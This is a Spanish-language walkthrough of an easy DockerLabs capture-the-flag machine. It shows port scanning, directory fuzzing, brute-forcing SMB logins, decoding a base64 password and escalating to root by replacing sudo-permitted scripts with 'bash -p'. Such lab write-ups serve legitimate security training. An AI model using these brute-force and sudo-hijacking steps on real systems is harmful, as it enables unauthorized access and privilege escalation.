Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #dockerlabs #smb

![](../assets/Pasted image 20251107000945.png)

## Reconocimiento

Empiezo tirando un escaneo con nmap
```bash
nmap -p- -sS -Pn -n --min-rate 5000 -vvv 172.17.0.2
----------------------------------------------------
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

Tiro un escaneo mas profundo sobre los puertos abiertos
```bash
nmap -p 22,80,139,445 -sCV -sS -Pn -n --min-rate 5000 -vvv 172.17.0.2
----------------------------------------------------------------------
ORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 39:f8:44:51:19:1a:a9:78:c2:21:e6:19:d3:1e:41:96 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFmj291adBscTtJfFsqsJ5+SDL2UY2Tbus+5WLsH88PJy/OUEvfBIU55KCsbwB2DHv+GJoj1LiDHXNtrSHPjVlA=
|   256 43:9b:ac:9c:d3:0c:ad:95:44:3a:c3:fb:9e:df:3e:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPl+8RksbbFRCVnH38jgJ9ahUL7OROoJjSyOBkc4TxyV
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: Juego de Tronos
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
MAC Address: BA:6A:21:B3:CA:59 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- Se están corriendo un servicios apache en el puerto 80 y samba en los puertos 139 y 445

## Enumeración


**Puerto 80**

- Lo único relevante que noto en la pagina principal son los posibles usuarios _jon_, _Daenerys_ y _Arya_ 
![](../assets/Pasted image 20251106200304.png)

Procedo a realizar Fuzzing con gobuster
```bash
> gobuster dir -w /home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://172.17.0.2/ -x html,php,js,py,txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1729]
/server-status        (Status: 403) [Size: 275]
/dragon               (Status: 301) [Size: 309] [--> http://172.17.0.2/dragon/]
```

Encuentro un directorio llamado _/dragon_ donde al parecer esta un archivo llamado EpisodiosT1
- Puede que sean posibles contraseñas por lo que procedo a bajarme la archivo 
![](../assets/Pasted image 20251106200637.png)

**Servicio SMB**

Con `smbmap` procedo a enumerar y listar recursos compartidos del servicio.
- Al parecer no tenemos acceso a nada
```bash
> smbmap -H 172.17.0.2
-------------------------------------------------------------------------------------------------------
[+] IP: 172.17.0.2:445	Name: 172.17.0.2                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	shared                                            	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.17.12-Debian)
	nobody                                            	NO ACCESS	Home Directories
```

## Explotación

Al ver que prácticamente no hay mucha informacion mas que los posibles usuarios y contraseñas que conseguí recopilar del servicio de apache lo primero que intento es un ataque de fuerza bruta al servicio _smb_ utilizando como diccionarios los posibles usuarios y contraseñas del servicio apache

```bash
> nxc smb 172.17.0.2 -u possible_users.txt -p possible_passwords
----------------------------------------------------------------
SMB         172.17.0.2      445    7BDD00394D8E     [+] 7BDD00394D8E\jon:seacercaelinvierno
```

- Al parecer tenemos acceso al servicio smb usando las credenciales _jon:seacercaelinvierno_.

Procedo a enumerar los recursos del servicio smb a los cuales el usuario jon tiene acceso
```bash
> smbclient -L //172.17.0.2 -U jon
Password for [WORKGROUP\jon]:
-------------------------------------------
      Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	shared          Disk      
```

- Tengo acceso al recurso shared

Me conecto a shared y veo que recursos existen dentro de el
- Al parecer existe un archivo llamado proteccion_del_reino el cual me bajo en mi maquina.
```bash
> smbclient //172.17.0.2/shared -U jon
Password for [WORKGROUP\jon]:
-------------------------------------------------------------------------------
smb: \> ls
  .                                   D        0  Tue Jul 16 14:26:00 2024
  ..                                  D        0  Tue Jul 16 14:25:59 2024
  proteccion_del_reino                N      313  Tue Jul 16 14:26:00 2024

smb: \> get proteccion_del_reino
```

Inspecciono el archivo _proteccion_del_reino_
```bash
> cat proteccion_del_reino
Aria de ti depende que los caminantes blancos no consigan pasar el muro. 
Tienes que llevar a la reina Daenerys el mensaje, solo ella sabra interpretarlo. Se encuentra cifrado en un lenguaje antiguo y dificil de entender. 
Esta es mi contraseña, se encuentra cifrada en ese lenguaje y es -> aGlqb2RlbGFuaXN0ZXI=
```

Al parecer nos proporcionan una contraseña codificada en base64 por lo cual decido decodificarla
```bash
> echo "aGlqb2RlbGFuaXN0ZXI=" | base64 -d; echo
hijodelanister
```

Ok por ahora lo que tenemos es una contraseña y los usuarios _jon_, _daenerys_ y _aria_ por lo cual ahora decido utilizar la contraseña proporcionada para tratar de conectarme mediante ssh con alguno de estos usuarios.
```bash
> ssh jon@172.17.0.2
```

- El usuario con el que pude ingresar al SSH fue _jon_



## Escalada de Privilegios

Dentro del sistema con el usuario _jon_ lo primero que hice fue listar binarios para ver si podía migrar a algún usuario

```bash
> sudo -l
----------------------------------------------------------
User jon may run the following commands on 7bdd00394d8e:
    (aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py
```

Al parecer podemos ejecutar un script llamado _mensaje.py_ por lo cual procedemos a realizar un sustitución del script, es decir vamos a borrar el script actual para remplazarlo por un script que ejecute una bash como el usuario aria

```bash
> jon@7bdd00394d8e:~$ rm /home/jon/.mensaje.py
> jon@7bdd00394d8e:~$ nano /home/jon/.mensaje.py
----------------------------------------------------
import os

os.system("bash -p")
----------------------------------------------------

```

Ejecutamos el script para migrar al usuario aria
```bash
jon@7bdd00394d8e:~$ sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
aria@7bdd00394d8e:/home/jon$ whoami
aria
```

Mismo proceso, volvemos a listar binarios pero ahora con el usuario aria
```bash
sudo -l
----------------------------------------------------------
User aria may run the following commands on 7bdd00394d8e:
    (daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls
```

Ahora vemos que podemos hacer uso de _ls_ y _cat_ como el usuario daenerys por lo cual procedemos a usar _ls_ para listar archivos del directorio /home/daenerys 
- Aquí vemos un archivo interesante llamado mensajeParaJon
```bash
ria@7bdd00394d8e:/home/jon$ sudo -u daenerys /usr/bin/ls -lsa /home/daenerys
total 16
0 drwx------ 1 daenerys daenerys    0 Jul 16  2024 .
0 drwxr-xr-x 1 root     root        6 Jul 16  2024 ..
4 -rw-r--r-- 1 daenerys daenerys  220 Mar 29  2024 .bash_logout
4 -rw-r--r-- 1 daenerys daenerys 3526 Mar 29  2024 .bashrc
4 -rw-r--r-- 1 daenerys daenerys  807 Mar 29  2024 .profile
0 drwxr-xr-x 1 root     root       18 Jul 16  2024 .secret
4 -rw-rw-r-- 1 daenerys daenerys  277 Jul 16  2024 mensajeParaJon
```

Sabiendo que existe un archivo que podemos ver ahora procedemos a hacer uso del _cat_ para inspeccionar el archivo mensajeParaJon.
```bash
> aria@7bdd00394d8e:/home/jon$ sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon
Aria estare encantada de ayudar a Jon con la guerra en el norte, siempre y cuando despues Jon cumpla y me ayude a  recuperar el trono de hierro. 
Te dejo en este mensaje la contraseña de mi usuario por si necesitas llamar a uno de mis dragones desde tu ordenador.

!drakaris!
```

Migramos al usuario _danerys_ con la password _drakaris_
```bash
> aria@7bdd00394d8e:/home/jon$ su daenerys
Password: 
> daenerys@7bdd00394d8e:/home/jon$ whoami
daenerys
```

Mismo proceso, volvemos a listar binarios que podamos ejecutar como el usuario root
- Podemos ejecutar un script de bash
```bash
daenerys@7bdd00394d8e:/home/jon$ sudo -l

User daenerys may run the following commands on 7bdd00394d8e:
    (ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

Remplazamos el contenido del script _.shell.sh_ por este
```bash
daenerys@7bdd00394d8e:~/.secret$ nano .shell.sh
daenerys@7bdd00394d8e:~/.secret$ cat .shell.sh 
#!/bin/bash

bash -p
```

Ejecutamos el script y escalamos a root
```bash
daenerys@7bdd00394d8e:~/.secret$ sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
root@7bdd00394d8e:/home/daenerys/.secret# whoami
root
```

***PWNED*